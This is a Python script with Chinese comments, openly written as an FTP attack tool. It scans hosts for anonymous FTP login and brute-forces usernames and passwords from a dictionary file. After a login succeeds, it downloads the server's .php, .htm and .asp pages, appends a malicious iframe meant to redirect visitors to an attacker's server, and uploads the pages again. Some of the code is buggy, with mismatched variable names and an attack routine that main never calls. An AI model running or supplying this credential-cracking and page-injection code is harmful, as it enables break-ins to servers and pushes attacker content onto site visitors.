
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from ftplib import *
import argparse
import time

#匿名登录扫描
def anonScan(hostname):                 #参数是主机名
    try:
        with FTP(hostname) as ftp:      #创建Ftp对象
            ftp.login()                 #Ftp匿名登录
            print('\n[*] ' + str(hostname) + " FTP Anonymous login successful!") #不抛出异常则表明登录成功
            return True
    except Exception as e:              #抛出异常则表明匿名登录失败
        print('\n[-] ' + str(hostname) + " FTP Anonymous logon failure!")
        return False

#暴力破解
def vlcLogin(hostname, pwdFile):                #参数(主机名，字典文件)
    try:
        with open(pwdFile, 'r') as pf:          #打开字典文件
            for line in pf.readlines():         #循环读取字典文件中的每一行
                time.sleep(1)                   #等待1秒
                userName = line.split(':')[0]   #从读取的内容中取出用户名
                passWord = line.split(':')[1].strip('\r').strip('\n') #从读取的内容中取出密码
                print('[+] Trying: ' + userName + ':' + passWord)
                try:
                    with FTP(hostname) as ftp:  #以主机名为参数构造Ftp对象
                        ftp.login(userName, passWord)   #使用读取出的用户名密码登录Ftp服务器
                        #如果没有产生异常则表示登录成功，打印主机名、用户名和密码
                        print('\n[+] ' + str(hostname) + ' FTP Login successful: '+ \
                              userName + ':' + passWord)
                        return (userName, passWord)
                except Exception as e:
                    # 产生异常表示没有登录成功，这里我们不用管它，继续尝试其他用户名、密码
                    pass
    except IOError as e:
        print('Error: the password file does not exist!')
    print('\n[-] Cannot crack the FTP password, please change the password dictionary try again!')
    return (None,None)

#如果密码破解成功，则搜索FTP服务器上的网页：
def returnDefalut(ftp):
    try:
        drilist = ftp.nlst()
    except:
        dirlist = []
        print("[-] Could not list directory contents.")
        print("[-] Skipping To Next Target.")
        return
    retList = []
    for fileName in drilist:
        fn = fileName.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print('[+] Found default page: '+ fileName)
            retList.append(fileName)
    return retList
#注入恶意代码到搜索到的网页 
#恶意代码为将访问该网页的流量重定向到恶意服务器
def injectPage(ftp,page,redirect):
    f = open(page +'.tmp','w')
    ftp.retrlines('RETR ' + page, f.write)
    print('[+] Downloaded Page: ' + page)
    f.write(redirect)
    f.close()
    print('[+] Injected Malicious IFrame on: '+ page)
    ftp.storlines('STOR ' + page,open(page + '.tmp'))
    print('[+] Uploaded Injected Page: ' + page)
#在破解出FTP用户名、密码后，攻击过程：搜索服务器上的网页并向其中注入恶意代码：   
def attack(username,password,tgtHost,redirect):
    ftp = ftplib.FTP(tgtHost)
    ftp.login(username,password)
    defPages = returnDefalut(ftp)
    for defPage in defPages:
        injectPage(ftp,defPage,redirect)
        
def main():
    # 这里用描述创建了ArgumentParser对象
    parser = argparse.ArgumentParser(description='FTP Scanner')
    # 添加-H命令dest可以理解为咱们解析时获取-H参数后面值的变量名,help是这个命令的帮助信息
    parser.add_argument('-H',dest='hostName',help='The host list with ","space')
    parser.add_argument('-f',dest='pwdFile',help='Password dictionary file')
    options = None
    try:
        options = parser.parse_args()

    except:
        print(parser.parse_args(['-h']))
        exit(0)

    hostNames = str(options.hostName).split(',')
    pwdFile = options.pwdFile
    if hostNames == ['None']:
        print(parser.parse_args(['-h']))
        exit(0)

    for hostName in hostNames:
        username = None
        password = None
        if anonScan(hostName) == True:
            print('Host: ' + hostName + ' Can anonymously!')
        elif pwdFile != None:
            (username,password) = vlcLogin(hostName,pwdFile)
            if password != None:
                print('\n[+] Host: ' + hostName + 'Username: ' + username + \
                      'Password: ' + password)

    print('\n[*]-------------------Scan End!--------------------[*]')


if __name__ == '__main__':
    main()
